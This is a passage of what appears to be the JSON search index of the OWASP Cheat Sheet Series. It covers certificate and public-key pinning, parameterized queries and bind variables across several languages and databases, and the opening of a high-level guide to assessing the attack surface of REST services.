(versus certificates) since you must extract the key from the certificate. Extraction is a minor inconvenience in Java and .Net, buts it's uncomfortable in Cocoa/CocoaTouch and OpenSSL. Second, the key is static and may violate key rotation policies. Hashing \u00b6 While the three choices above used DER encoding, its also acceptable to use a hash of the information. In fact, the original sample programs were written using digested certificates and public keys. The samples were changed to allow a programmer to inspect the objects with tools like dumpasn1 and other ASN.1 decoders. Hashing also provides three additional benefits. First, hashing allows you to anonymize a certificate or public key. This might be important if you application is concerned about leaking information during decompilation and re-engineering. Second, a digested certificate fingerprint is often available as a native API for many libraries, so its convenient to use. Finally, an organization might want to supply a reserve (or back-up) identity in case the primary identity is compromised. Hashing ensures your adversaries do not see the reserved certificate or public key in advance of its use. In fact, Google's IETF draft websec-key-pinning uses the technique. Examples of Pinning \u00b6 This section discusses certificate and public key pinning in Android Java, iOS, .Net, and OpenSSL. Code has been omitted for brevity, but the key points for the platform are highlighted. Android \u00b6 Since Android N, the preferred way for implementing pinning is by leveraging Android's Network Security Configuration feature, which lets apps customize their network security settings in a safe, declarative configuration file without modifying app code. To enable pinning, the <pin-set> configuration setting can be used. If devices running a version of Android that is earlier than N need to be supported, a backport of the Network Security Configuration pinning functionality is available via the TrustKit Android library . Alternatively you can use methods such as the pinning from OkHTTP in order to set specific pins programmatically, as explained in the MSTG and the OKHttp documentation . The Android documentation provides an example of how SSL validation can be customized within the app's code (in order to implement pinning) in the Unknown CA implementation document . However, implementing pinning validation from scratch should be avoided, as implementation mistakes are extremely likely and usually lead to severe vulnerabilities. Lastly, if you want to validate whether the pinning is successful, please follow instructions from the Mobile Security Testing Guide's ntroduction into testing network communication and the Android specific network testing . iOS \u00b6 TrustKit , an open-source SSL pinning library for iOS and macOS is available. It provides an easy-to-use API for implementing pinning, and has been deployed in many apps. Otherwise, more details regarding how SSL validation can be customized on iOS (in order to implement pinning) are available in the HTTPS Server Trust Evaluation technical note. However, implementing pinning validation from scratch should be avoided, as implementation mistakes are extremely likely and usually lead to severe vulnerabilities. Lastly, if you want to validate whether the pinning is successful, please follow instructions from the Mobile Security Testing Guide's introduction into testing network communication and the iOS specific network testing . .Net \u00b6 .Net pinning can be achieved by using ServicePointManager . An example can be found at the OWASP MSTG . Download the .Net sample program . OpenSSL \u00b6 Pinning can occur at one of two places with OpenSSL. First is the user supplied verify_callback . Second is after the connection is established via SSL_get_peer_certificate . Either method will allow you to access the peer's certificate. Though OpenSSL performs the X509 checks, you must fail the connection and tear down the socket on error. By design, a server that does not supply a certificate will result in X509_V_OK with a NULL certificate. To check the result of the customary verification: You must call SSL_get_verify_result and verify the return code is X509_V_OK ; You must call SSL_get_peer_certificate and verify the certificate is non-NULL . Download: OpenSSL sample program . Electron \u00b6 electron-ssl-pinning , an open-source SSL pinning library for Electron based applications. It provides an easy-to-use API for implementing pinning and also provides tool for fetching configuration based on needed hosts. Otherwise, you can validate certificates by yourself using ses.setCertificateVerifyProc(proc) . References \u00b6 OWASP Injection Theory OWASP Data Validation OWASP Transport Layer Protection Cheat Sheet OWASP Mobile Security Testing Guide IETF RFC 1421 (PEM Encoding) IETF RFC 4648 (Base16, Base32, and Base64 Encodings) IETF RFC 5280 (Internet X.509, PKIX) IETF RFC 3279 (PKI, X509 Algorithms and CRL Profiles) IETF RFC 4055 (PKI, X509 Additional Algorithms and CRL Profiles) IETF RFC 2246 (TLS 1.0) IETF RFC 4346 (TLS 1.1) IETF RFC 5246 (TLS 1.2) IETF PKCS #1: RSA Cryptography Specifications Version 2.2","title":"Pinning"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#pinning-cheat-sheet","text":"","title":"Pinning Cheat Sheet"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#introduction","text":"The Pinning Cheat Sheet is a technical guide to implementing certificate and public key pinning as discussed at the Virginia chapter's presentation Securing Wireless Channels in the Mobile Space . This guide is focused on providing clear, simple, actionable guidance for securing the channel in a hostile environment where actors could be malicious and the conference of trust a liability.","title":"Introduction"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#whats-the-problem","text":"Users, developers, and applications expect end-to-end security on their secure channels, but some secure channels are not meeting the expectation. Specifically, channels built using well known protocols such as VPN, SSL, and TLS can be vulnerable to a number of attacks.","title":"What's the problem"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#what-is-pinning","text":"Pinning is the process of associating a host with their expected X509 certificate or public key. Once a certificate or public key is known or seen for a host, the certificate or public key is associated or 'pinned' to the host. If more than one certificate or public key is acceptable, then the program holds a pinset (taking from Jon Larimer and Kenny Root Google I/O talk ). In this case, the advertised identity must match one of the elements in the pinset. A host or service's certificate or public key can be added to an application at development time, or it can be added upon first encountering the certificate or public key. The former - adding at development time - is preferred since preloading the certificate or public key out of band usually means the attacker cannot taint the pin.","title":"What Is Pinning"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#when-do-you-pin","text":"You should pin anytime you want to be relatively certain of the remote host's identity or when operating in a hostile environment. Since one or both are almost always true, you should probably pin all the time.","title":"When Do You Pin"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#when-do-you-whitelist","text":"If you are working for an organization which practices \"egress filtering\" as part of a Data Loss Prevention (DLP) strategy, you will likely encounter Interception Proxies . I like to refer to these things as \"good\" bad guys (as opposed to \"bad\" bad guys ) since both break end-to-end security and we can't tell them apart. In this case, do not offer to whitelist the interception proxy since it defeats your security goals. Add the interception proxy's public key to your pinset after being instructed to do so by the folks in Risk Acceptance.","title":"When Do You Whitelist"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#how-do-you-pin","text":"The idea is to re-use the exiting protocols and infrastructure, but use them in a hardened manner. For re-use, a program would keep doing the things it used to do when establishing a secure connection. To harden the channel, the program would take advantage of the OnConnect callback offered by a library, framework or platform. In the callback, the program would verify the remote host's identity by validating its certificate or public key.","title":"How Do You Pin"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#what-should-be-pinned","text":"The first thing to decide is what should be pinned. For this choice, you have two options: Pin the certificate. Pin the public key. If you choose public keys, you have two additional choices: Pin the subjectPublicKeyInfo . Pin one of the concrete types such as RSAPublicKey or DSAPublicKey . subjectPublicKeyInfo : The three choices are explained below in more detail. I would encourage you to pin the subjectPublicKeyInfo because it has the public parameters (such as {e,n} for an RSA public key) and contextual information such as an algorithm and OID. The context will help you keep your bearings at times, and the figure to the right shows the additional information available.","title":"What Should Be Pinned"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#certificate","text":"The certificate is easiest to pin. You can fetch the certificate out of band for the website, have the IT folks email your company certificate to you, use openssl s_client to retrieve the certificate etc. At runtime, you retrieve the website or server's certificate in the callback. Within the callback, you compare the retrieved certificate with the certificate embedded within the program. If the comparison fails, then fail the method or function. There is a downside to pinning a certificate. If the site rotates its certificate on a regular basis, then your application would need to be updated regularly. For example, Google rotates its certificates, so you will need to update your application about once a month (if it depended on Google services). Even though Google rotates its certificates, the underlying public keys (within the certificate) remain static.","title":"Certificate"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#public-key","text":"Public key pinning is more flexible but a little trickier due to the extra steps necessary to extract the public key from a certificate. As with a certificate, the program checks the extracted public key with its embedded copy of the public key. There are two downsides to public key pinning. First, it's harder to work with keys (versus certificates) since you must extract the key from the certificate. Extraction is a minor inconvenience in Java and .Net, buts it's uncomfortable in Cocoa/CocoaTouch and OpenSSL. Second, the key is static and may violate key rotation policies.","title":"Public Key"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#hashing","text":"While the three choices above used DER encoding, its also acceptable to use a hash of the information. In fact, the original sample programs were written using digested certificates and public keys. The samples were changed to allow a programmer to inspect the objects with tools like dumpasn1 and other ASN.1 decoders. Hashing also provides three additional benefits. First, hashing allows you to anonymize a certificate or public key. This might be important if you application is concerned about leaking information during decompilation and re-engineering. Second, a digested certificate fingerprint is often available as a native API for many libraries, so its convenient to use. Finally, an organization might want to supply a reserve (or back-up) identity in case the primary identity is compromised. Hashing ensures your adversaries do not see the reserved certificate or public key in advance of its use. In fact, Google's IETF draft websec-key-pinning uses the technique.","title":"Hashing"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#examples-of-pinning","text":"This section discusses certificate and public key pinning in Android Java, iOS, .Net, and OpenSSL. Code has been omitted for brevity, but the key points for the platform are highlighted.","title":"Examples of Pinning"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#android","text":"Since Android N, the preferred way for implementing pinning is by leveraging Android's Network Security Configuration feature, which lets apps customize their network security settings in a safe, declarative configuration file without modifying app code. To enable pinning, the <pin-set> configuration setting can be used. If devices running a version of Android that is earlier than N need to be supported, a backport of the Network Security Configuration pinning functionality is available via the TrustKit Android library . Alternatively you can use methods such as the pinning from OkHTTP in order to set specific pins programmatically, as explained in the MSTG and the OKHttp documentation . The Android documentation provides an example of how SSL validation can be customized within the app's code (in order to implement pinning) in the Unknown CA implementation document . However, implementing pinning validation from scratch should be avoided, as implementation mistakes are extremely likely and usually lead to severe vulnerabilities. Lastly, if you want to validate whether the pinning is successful, please follow instructions from the Mobile Security Testing Guide's ntroduction into testing network communication and the Android specific network testing .","title":"Android"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#ios","text":"TrustKit , an open-source SSL pinning library for iOS and macOS is available. It provides an easy-to-use API for implementing pinning, and has been deployed in many apps. Otherwise, more details regarding how SSL validation can be customized on iOS (in order to implement pinning) are available in the HTTPS Server Trust Evaluation technical note. However, implementing pinning validation from scratch should be avoided, as implementation mistakes are extremely likely and usually lead to severe vulnerabilities. Lastly, if you want to validate whether the pinning is successful, please follow instructions from the Mobile Security Testing Guide's introduction into testing network communication and the iOS specific network testing .","title":"iOS"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#net","text":".Net pinning can be achieved by using ServicePointManager . An example can be found at the OWASP MSTG . Download the .Net sample program .","title":".Net"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#openssl","text":"Pinning can occur at one of two places with OpenSSL. First is the user supplied verify_callback . Second is after the connection is established via SSL_get_peer_certificate . Either method will allow you to access the peer's certificate. Though OpenSSL performs the X509 checks, you must fail the connection and tear down the socket on error. By design, a server that does not supply a certificate will result in X509_V_OK with a NULL certificate. To check the result of the customary verification: You must call SSL_get_verify_result and verify the return code is X509_V_OK ; You must call SSL_get_peer_certificate and verify the certificate is non-NULL . Download: OpenSSL sample program .","title":"OpenSSL"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#electron","text":"electron-ssl-pinning , an open-source SSL pinning library for Electron based applications. It provides an easy-to-use API for implementing pinning and also provides tool for fetching configuration based on needed hosts. Otherwise, you can validate certificates by yourself using ses.setCertificateVerifyProc(proc) .","title":"Electron"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html#references","text":"OWASP Injection Theory OWASP Data Validation OWASP Transport Layer Protection Cheat Sheet OWASP Mobile Security Testing Guide IETF RFC 1421 (PEM Encoding) IETF RFC 4648 (Base16, Base32, and Base64 Encodings) IETF RFC 5280 (Internet X.509, PKIX) IETF RFC 3279 (PKI, X509 Algorithms and CRL Profiles) IETF RFC 4055 (PKI, X509 Additional Algorithms and CRL Profiles) IETF RFC 2246 (TLS 1.0) IETF RFC 4346 (TLS 1.1) IETF RFC 5246 (TLS 1.2) IETF PKCS #1: RSA Cryptography Specifications Version 2.2","title":"References"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html","text":"Query Parameterization Cheat Sheet \u00b6 Introduction \u00b6 SQL Injection is one of the most dangerous web vulnerabilities. So much so that it's the #1 item in the OWASP Top 10 . It represents a serious threat because SQL Injection allows evil attacker code to change the structure of a web application's SQL statement in a way that can steal data, modify data, or potentially facilitate command injection to the underlying OS. This cheat sheet is a derivative work of the SQL Injection Prevention Cheat Sheet . Parameterized Query Examples \u00b6 SQL Injection is best prevented through the use of parameterized queries . The following chart demonstrates, with real-world code samples, how to build parameterized queries in most of the common web languages. The purpose of these code samples is to demonstrate to the web developer how to avoid SQL Injection when building database queries within a web application. Prepared Statement Examples \u00b6 Using Java built-in feature \u00b6 String custname = request . getParameter ( \"customerName\" ); String query = \"SELECT account_balance FROM user_data WHERE user_name = ? \" ; PreparedStatement pstmt = connection . prepareStatement ( query ); pstmt . setString ( 1 , custname ); ResultSet results = pstmt . executeQuery ( ); Using Java with Hibernate \u00b6 //HQL @Entity // declare as entity; @NamedQuery ( name = \"findByDescription\" , query = \"FROM Inventory i WHERE i.productDescription = :productDescription\" ) public class Inventory implements Serializable { @Id private long id ; private String productDescription ; } // use case // This should REALLY be validated too String userSuppliedParameter = request . getParameter ( \"Product-Description\" ); // perform input validation to detect attacks List < Inventory > list = session . getNamedQuery ( \"findByDescription\" ) . setParameter ( \"productDescription\" , userSuppliedParameter ). list (); //Criteria API // This should REALLY be validated too String userSuppliedParameter = request . getParameter ( \"Product-Description\" ); // perform input validation to detect attacks Inventory inv = ( Inventory ) session . createCriteria ( Inventory . class ). add ( Restrictions . eq ( \"productDescription\" , userSuppliedParameter )). uniqueResult (); Using .NET built-in feature \u00b6 String query = \"SELECT account_balance FROM user_data WHERE user_name = ?\" ; try { OleDbCommand command = new OleDbCommand ( query , connection ); command . Parameters . Add ( new OleDbParameter ( \"customerName\" , CustomerName Name . Text )); OleDbDataReader reader = command . ExecuteReader (); // \u2026 } catch ( OleDbException se ) { // error handling } Using ASP .NET built-in feature \u00b6 string sql = \"SELECT * FROM Customers WHERE CustomerId = @CustomerId\" ; SqlCommand command = new SqlCommand ( sql ); command . Parameters . Add ( new SqlParameter ( \"@CustomerId\" , System . Data . SqlDbType . Int )); command . Parameters [ \"@CustomerId\" ]. Value = 1 ; Using Ruby with ActiveRecord \u00b6 ## Create Project . create! ( :name => 'owasp' ) ## Read Project . all ( :conditions => \"name = ?\" , name ) Project . all ( :conditions => { :name => name }) Project . where ( \"name = :name\" , :name => name ) ## Update project . update_attributes ( :name => 'owasp' ) ## Delete Project . delete ( :name => 'name' ) Using Ruby built-in feature \u00b6 insert_new_user = db . prepare \"INSERT INTO users (name, age, gender) VALUES (?, ? ,?)\" insert_new_user . execute 'aizatto' , '20' , 'male' Using PHP with PHP Data Objects \u00b6 $stmt = $dbh->prepare(\"INSERT INTO REGISTRY (name, value) VALUES (:name, :value)\"); $stmt->bindParam(':name', $name); $stmt->bindParam(':value', $value); Using Cold Fusion built-in feature \u00b6 <cfquery name = \"getFirst\" dataSource = \"cfsnippets\" > SELECT * FROM #strDatabasePrefix#_courses WHERE intCourseID = <cfqueryparam value = #intCourseID# CFSQLType = \"CF_SQL_INTEGER\" > </cfquery> Using PERL with Database Independent Interface \u00b6 my $sql = \"INSERT INTO foo (bar, baz) VALUES ( ?, ? )\" ; my $sth = $dbh -> prepare ( $sql ); $sth -> execute ( $bar , $baz ); Stored Procedure Examples \u00b6 The SQL you write in your web application isn't the only place that SQL injection vulnerabilities can be introduced. If you are using Stored Procedures, and you are dynamically constructing SQL inside them, you can also introduce SQL injection vulnerabilities. To ensure this dynamic SQL is secure, you can parameterize this dynamic SQL too using bind variables. Here are some examples of using bind variables in stored procedures in different databases. Oracle using PL/SQL \u00b6 Normal Stored Procedure \u00b6 No dynamic SQL being created. Parameters passed in to stored procedures are naturally bound to their location within the query without anything special being required: PROCEDURE SafeGetBalanceQuery ( UserID varchar , Dept varchar ) AS BEGIN SELECT balance FROM accounts_table WHERE user_ID = UserID AND department = Dept ; END ; Stored Procedure Using Bind Variables in SQL Run with EXECUTE \u00b6 Bind variables are used to tell the database that the inputs to this dynamic SQL are 'data' and not possibly code: PROCEDURE AnotherSafeGetBalanceQuery ( UserID varchar , Dept varchar ) AS stmt VARCHAR ( 400 ); result NUMBER ; BEGIN stmt : = 'SELECT balance FROM accounts_table WHERE user_ID = :1 AND department = :2' ; EXECUTE IMMEDIATE stmt INTO result USING UserID , Dept ; RETURN result ; END ; SQL Server using Transact-SQL \u00b6 Normal Stored Procedure \u00b6 No dynamic SQL being created. Parameters passed in to stored procedures are naturally bound to their location within the query without anything special being required: PROCEDURE SafeGetBalanceQuery ( @ UserID varchar ( 20 ), @ Dept varchar ( 10 )) AS BEGIN SELECT balance FROM accounts_table WHERE user_ID = @ UserID AND department = @ Dept END Stored Procedure Using Bind Variables in SQL Run with EXEC \u00b6 Bind variables are used to tell the database that the inputs to this dynamic SQL are 'data' and not possibly code: PROCEDURE SafeGetBalanceQuery ( @ UserID varchar ( 20 ), @ Dept varchar ( 10 )) AS BEGIN DECLARE @ sql VARCHAR ( 200 ) SELECT @ sql = 'SELECT balance FROM accounts_table WHERE ' + 'user_ID = @UID AND department = @DPT' EXEC sp_executesql @ sql , '@UID VARCHAR(20), @DPT VARCHAR(10)' , @ UID =@ UserID , @ DPT =@ Dept END References \u00b6 The Bobby Tables site (inspired by the XKCD webcomic) has numerous examples in different languages of parameterized Prepared Statements and Stored Procedures OWASP SQL Injection Prevention Cheat Sheet","title":"Query Parameterization"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#query-parameterization-cheat-sheet","text":"","title":"Query Parameterization Cheat Sheet"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#introduction","text":"SQL Injection is one of the most dangerous web vulnerabilities. So much so that it's the #1 item in the OWASP Top 10 . It represents a serious threat because SQL Injection allows evil attacker code to change the structure of a web application's SQL statement in a way that can steal data, modify data, or potentially facilitate command injection to the underlying OS. This cheat sheet is a derivative work of the SQL Injection Prevention Cheat Sheet .","title":"Introduction"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#parameterized-query-examples","text":"SQL Injection is best prevented through the use of parameterized queries . The following chart demonstrates, with real-world code samples, how to build parameterized queries in most of the common web languages. The purpose of these code samples is to demonstrate to the web developer how to avoid SQL Injection when building database queries within a web application.","title":"Parameterized Query Examples"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#prepared-statement-examples","text":"","title":"Prepared Statement Examples"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#using-java-built-in-feature","text":"String custname = request . getParameter ( \"customerName\" ); String query = \"SELECT account_balance FROM user_data WHERE user_name = ? \" ; PreparedStatement pstmt = connection . prepareStatement ( query ); pstmt . setString ( 1 , custname ); ResultSet results = pstmt . executeQuery ( );","title":"Using Java built-in feature"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#using-java-with-hibernate","text":"//HQL @Entity // declare as entity; @NamedQuery ( name = \"findByDescription\" , query = \"FROM Inventory i WHERE i.productDescription = :productDescription\" ) public class Inventory implements Serializable { @Id private long id ; private String productDescription ; } // use case // This should REALLY be validated too String userSuppliedParameter = request . getParameter ( \"Product-Description\" ); // perform input validation to detect attacks List < Inventory > list = session . getNamedQuery ( \"findByDescription\" ) . setParameter ( \"productDescription\" , userSuppliedParameter ). list (); //Criteria API // This should REALLY be validated too String userSuppliedParameter = request . getParameter ( \"Product-Description\" ); // perform input validation to detect attacks Inventory inv = ( Inventory ) session . createCriteria ( Inventory . class ). add ( Restrictions . eq ( \"productDescription\" , userSuppliedParameter )). uniqueResult ();","title":"Using Java with Hibernate"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#using-net-built-in-feature","text":"String query = \"SELECT account_balance FROM user_data WHERE user_name = ?\" ; try { OleDbCommand command = new OleDbCommand ( query , connection ); command . Parameters . Add ( new OleDbParameter ( \"customerName\" , CustomerName Name . Text )); OleDbDataReader reader = command . ExecuteReader (); // \u2026 } catch ( OleDbException se ) { // error handling }","title":"Using .NET built-in feature"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#using-asp-net-built-in-feature","text":"string sql = \"SELECT * FROM Customers WHERE CustomerId = @CustomerId\" ; SqlCommand command = new SqlCommand ( sql ); command . Parameters . Add ( new SqlParameter ( \"@CustomerId\" , System . Data . SqlDbType . Int )); command . Parameters [ \"@CustomerId\" ]. Value = 1 ;","title":"Using ASP .NET built-in feature"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#using-ruby-with-activerecord","text":"## Create Project . create! ( :name => 'owasp' ) ## Read Project . all ( :conditions => \"name = ?\" , name ) Project . all ( :conditions => { :name => name }) Project . where ( \"name = :name\" , :name => name ) ## Update project . update_attributes ( :name => 'owasp' ) ## Delete Project . delete ( :name => 'name' )","title":"Using Ruby with ActiveRecord"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#using-ruby-built-in-feature","text":"insert_new_user = db . prepare \"INSERT INTO users (name, age, gender) VALUES (?, ? ,?)\" insert_new_user . execute 'aizatto' , '20' , 'male'","title":"Using Ruby built-in feature"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#using-php-with-php-data-objects","text":"$stmt = $dbh->prepare(\"INSERT INTO REGISTRY (name, value) VALUES (:name, :value)\"); $stmt->bindParam(':name', $name); $stmt->bindParam(':value', $value);","title":"Using PHP with PHP Data Objects"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#using-cold-fusion-built-in-feature","text":"<cfquery name = \"getFirst\" dataSource = \"cfsnippets\" > SELECT * FROM #strDatabasePrefix#_courses WHERE intCourseID = <cfqueryparam value = #intCourseID# CFSQLType = \"CF_SQL_INTEGER\" > </cfquery>","title":"Using Cold Fusion built-in feature"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#using-perl-with-database-independent-interface","text":"my $sql = \"INSERT INTO foo (bar, baz) VALUES ( ?, ? )\" ; my $sth = $dbh -> prepare ( $sql ); $sth -> execute ( $bar , $baz );","title":"Using PERL with Database Independent Interface"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#stored-procedure-examples","text":"The SQL you write in your web application isn't the only place that SQL injection vulnerabilities can be introduced. If you are using Stored Procedures, and you are dynamically constructing SQL inside them, you can also introduce SQL injection vulnerabilities. To ensure this dynamic SQL is secure, you can parameterize this dynamic SQL too using bind variables. Here are some examples of using bind variables in stored procedures in different databases.","title":"Stored Procedure Examples"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#oracle-using-plsql","text":"","title":"Oracle using PL/SQL"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#normal-stored-procedure","text":"No dynamic SQL being created. Parameters passed in to stored procedures are naturally bound to their location within the query without anything special being required: PROCEDURE SafeGetBalanceQuery ( UserID varchar , Dept varchar ) AS BEGIN SELECT balance FROM accounts_table WHERE user_ID = UserID AND department = Dept ; END ;","title":"Normal Stored Procedure"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#stored-procedure-using-bind-variables-in-sql-run-with-execute","text":"Bind variables are used to tell the database that the inputs to this dynamic SQL are 'data' and not possibly code: PROCEDURE AnotherSafeGetBalanceQuery ( UserID varchar , Dept varchar ) AS stmt VARCHAR ( 400 ); result NUMBER ; BEGIN stmt : = 'SELECT balance FROM accounts_table WHERE user_ID = :1 AND department = :2' ; EXECUTE IMMEDIATE stmt INTO result USING UserID , Dept ; RETURN result ; END ;","title":"Stored Procedure Using Bind Variables in SQL Run with EXECUTE"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#sql-server-using-transact-sql","text":"","title":"SQL Server using Transact-SQL"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#normal-stored-procedure_1","text":"No dynamic SQL being created. Parameters passed in to stored procedures are naturally bound to their location within the query without anything special being required: PROCEDURE SafeGetBalanceQuery ( @ UserID varchar ( 20 ), @ Dept varchar ( 10 )) AS BEGIN SELECT balance FROM accounts_table WHERE user_ID = @ UserID AND department = @ Dept END","title":"Normal Stored Procedure"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#stored-procedure-using-bind-variables-in-sql-run-with-exec","text":"Bind variables are used to tell the database that the inputs to this dynamic SQL are 'data' and not possibly code: PROCEDURE SafeGetBalanceQuery ( @ UserID varchar ( 20 ), @ Dept varchar ( 10 )) AS BEGIN DECLARE @ sql VARCHAR ( 200 ) SELECT @ sql = 'SELECT balance FROM accounts_table WHERE ' + 'user_ID = @UID AND department = @DPT' EXEC sp_executesql @ sql , '@UID VARCHAR(20), @DPT VARCHAR(10)' , @ UID =@ UserID , @ DPT =@ Dept END","title":"Stored Procedure Using Bind Variables in SQL Run with EXEC"},{"location":"cheatsheets/Query_Parameterization_Cheat_Sheet.html#references","text":"The Bobby Tables site (inspired by the XKCD webcomic) has numerous examples in different languages of parameterized Prepared Statements and Stored Procedures OWASP SQL Injection Prevention Cheat Sheet","title":"References"},{"location":"cheatsheets/REST_Assessment_Cheat_Sheet.html","text":"REST Assessment Cheat Sheet \u00b6 About RESTful Web Services \u00b6 Web Services are an implementation of web technology used for machine to machine communication. As such they are used for Inter application communication, Web 2.0 and Mashups and by desktop and mobile applications to call a server. RESTful web services (often called simply REST) are a light weight variant of Web Services based on the RESTful design pattern. In practice RESTful web services utilizes HTTP requests that are similar to regular HTTP calls in contrast with other Web Services technologies such as SOAP which utilizes a complex protocol. Key relevant properties of RESTful web services \u00b6 Use of HTTP methods ( GET , POST , PUT and DELETE ) as the primary verb for the requested operation. Non-standard parameters specifications: As part of the URL. In headers. Structured parameters and responses using JSON or XML in a parameter values, request body or response body. Those are required to communicate machine useful information. Custom authentication and session management, often utilizing custom security tokens: this is needed as machine to machine communication does not allow for login sequences. Lack of formal documentation. A proposed standard for describing RESTful web services called WADL was submitted by Sun Microsystems but was never officially adapted. The challenge of security testing RESTful web services \u00b6 Inspecting the application does not reveal the attack surface, I.e. the URLs and parameter structure used by the RESTful web service. The reasons are: No application utilizes all the available functions and parameters exposed by the service Those used are often activated dynamically by client side code and not as links in pages. The client application is often not a web application and does not allow inspection of the activating link or even relevant code. The parameters are none standard making it hard to determine what is just part of the URL or a constant header and what is a parameter worth fuzzing . As a machine interface the number of parameters used can be very large, for example a JSON structure may include dozens of parameters. fuzzing each one significantly lengthen the time required for testing. Custom authentication mechanisms require reverse engineering and make popular tools not useful as they cannot track a login session. How to pentest a RESTful web service \u00b6 Determine the attack surface through documentation - RESTful pen testing might be better off if some level of white box testing is allowed and you can get information about the service. This information will ensure fuller coverage of the attack surface. Such information to look for: Formal service description - While for other types of web services such as SOAP a formal description, usually in WSDL is often available, this is seldom the case for REST. That said, either WSDL 2.0 or WADL can describe REST and are sometimes used. A developer guide for using the service may be less detailed but will commonly be found, and might even be considered black box . Application source or configuration - in many frameworks, including dotNet ,the REST service definition might be easily obtained from configuration files rather than from code. Collect full requests using a proxy - while always an important pen testing step, this is more important for REST based applications as the application UI may not give clues on the actual attack surface. Note that the proxy must be able to collect full requests and not just URLs as REST services utilize more than just GET parameters. Analyze collected requests to determine the attack surface: Look for non-standard parameters: Look for abnormal HTTP headers - those would many times be header based parameters. Determine if a URL segment has a repeating pattern across URLs. Such patterns can include a date, a number or an ID like string and indicate that the URL segment is a URL embedded parameter. For example: http://server/srv/2013-10-21/use.php Look for structured parameter values - those may be JSON, XML or a non-standard structure. If the last element of a URL does not have an extension, it may be a parameter. This is especially true if the application technology normally uses extensions or if a previous segment does have an extension. For example: http://server/svc/Grid.asmx/GetRelatedListItems Look for highly varying URL segments - a single URL segment that has many values may be parameter and not a physical directory. For example if the URL http://server/src/XXXX/page repeats with hundreds of value for XXXX , chances XXXX is a parameter. Verify non-standard parameters: in some cases (but not all), setting the value of a URL segment suspected of being a parameter to a value expected to be invalid can help determine if it is a path elements of a parameter. If a path element, the web server will return a 404 message, while for an invalid value to a parameter the answer would be an application level message as the value is legal at the web server level. Analyzing collected requests to optimize fuzzing - after identifying potential parameters to fuzz, analyze the collected values for each to determine: Valid vs. invalid values, so that fuzzing can focus on marginal invalid values. For example sending 0 for a value found to be always a positive integer. Sequences allowing to fuzz beyond the range presumably allocated to the current user. Lastly, when fuzzing , don't forget to emulate the authentication mechanism used. Related Resources \u00b6 REST Security Cheat Sheet - the other side of this cheat sheet RESTful services, web security blind spot - a presentation (including video) elaborating on most of the topics on this cheat sheet.","title":"REST Assessment"},{"location":"cheatsheets/REST_Assessment_Cheat_Sheet.html#rest-assessment-cheat-sheet","text":"","title":"REST Assessment Cheat Sheet"},{"location":"cheatsheets/REST_Assessment_Cheat_Sheet.html#about-restful-web-services","text":"Web Services are an implementation of web technology used for machine to machine communication. As such they are used for Inter application communication, Web 2.0 and Mashups and by desktop and mobile applications to call a server. RESTful web services (often called simply REST) are a light weight variant of Web Services based on the RESTful design pattern. In practice RESTful web services utilizes HTTP requests that are similar to regular HTTP calls in contrast with other Web Services technologies such as SOAP which utilizes a complex protocol.","title":"About RESTful Web Services"},{"location":"cheatsheets/REST_Assessment_Cheat_Sheet.html#key-relevant-properties-of-restful-web-services","text":"Use of HTTP methods ( GET , POST , PUT and DELETE ) as the primary verb for the requested operation. Non-standard parameters specifications: As part of the URL. In headers. Structured parameters and responses using JSON or XML in a parameter values, request body or response body. Those are required to communicate machine useful information. Custom authentication and session management, often utilizing custom security tokens: this is needed as machine to machine communication does not allow for login sequences. Lack of formal documentation. A proposed standard for describing RESTful web services called WADL was submitted by Sun Microsystems but was never officially adapted.","title":"Key relevant properties of RESTful web services"},{"location":"cheatsheets/REST_Assessment_Cheat_Sheet.html#the-challenge-of-security-testing-restful-web-services","text":"Inspecting the application does not reveal the attack surface, I.e. the URLs and parameter structure used by the RESTful web service. The reasons are: No application utilizes all the available functions and parameters exposed by the service Those used are often activated dynamically by client side code and not as links in pages. The client application is often not a web application and does not allow inspection of the activating link or even relevant code. The parameters are none standard making it hard to determine what is just part of the URL or a constant header and what is a parameter worth fuzzing . As a machine interface the number of parameters used can be very large, for example a JSON structure may include dozens of parameters. fuzzing each one significantly lengthen the time required for testing. Custom authentication mechanisms require reverse engineering and make popular tools not useful as they cannot track a login session.","title":"The challenge of security testing RESTful web services"},{"location":"cheatsheets/REST_Assessment_Cheat_Sheet.html#how-to-pentest-a-restful-web-service","text":"Determine the attack surface through documentation - RESTful pen testing might 